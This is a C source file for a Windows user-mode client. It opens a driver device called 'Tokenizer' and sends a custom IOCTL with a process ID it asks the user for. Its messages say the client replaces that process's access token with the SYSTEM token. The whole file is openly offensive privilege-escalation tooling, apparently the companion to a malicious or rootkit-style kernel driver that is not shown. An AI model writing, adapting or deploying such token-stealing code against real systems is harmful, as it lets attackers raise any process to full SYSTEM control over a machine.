#include <Windows.h>
#include <stdio.h>

#define ppid CTL_CODE(FILE_DEVICE_UNKNOWN,0x69,METHOD_BUFFERED ,FILE_ANY_ACCESS)

int
isProcessRunning(
	int pid
)
{
	HANDLE phandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (!phandle)
		return (-1);
	CloseHandle(phandle);
	return (0);

}

int
wmain(
	void
)
{
	int pid = 0;
	printf("Enter process ID (pid) :");
	scanf_s("%d", &pid);
	DWORD lpBytesReturned;
	HANDLE hdevice = CreateFile(L"\\\\.\\Tokenizer", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hdevice == INVALID_HANDLE_VALUE)
		printf("failed to open device\n");
	else
		printf("driver device opened\n");

	if (DeviceIoControl(hdevice, ppid, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, nullptr))
		printf("IOCTL %x sent!\n", ppid);
	else
		printf("Failed to send the IOCTL %x.\n", ppid);

	if (!lpBytesReturned)
	{
		printf("Process %d token replaced successfully with system token!\n", pid);
	}
	else
	{
		if (!isProcessRunning(pid))
			printf("Failed to replace token.\n");
		else
			printf("Invalid process ID (pid). Please make sure to provide a valid pid.\n");
	}
	CloseHandle(hdevice);
	system("pause");
	return (0);
}
